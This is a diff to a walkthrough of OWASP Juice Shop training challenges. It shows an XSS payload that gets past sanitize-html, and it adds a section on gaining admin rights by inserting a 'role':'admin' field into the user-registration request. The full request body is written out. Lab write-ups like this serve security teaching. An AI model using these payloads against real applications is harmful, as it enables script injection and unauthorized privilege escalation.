@@ -148,3 +148,10 @@ Post a comment that bypasses a vulnerability in the library [sanitize-html versi
 ```
 <<love this juice>iframe src="javascript:alert(`xss`)">
 ```
+## Improper Input Validation
+### 1. Admin Registration
+Register as a new user and then inspect the Network traffic for `/api/Users/`. Repeat the POST request again but this time change the email slightly and add a "role" header with the value "admin":
+```
+{"email":"gen-admin2@juice-sh.op",
+"role":"admin","password":"admin123","passwordRepeat":"admin123","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-02-27T06:51:33.047Z","updatedAt":"2025-02-27T06:51:33.047Z"},"securityAnswer":"admin"}
+```
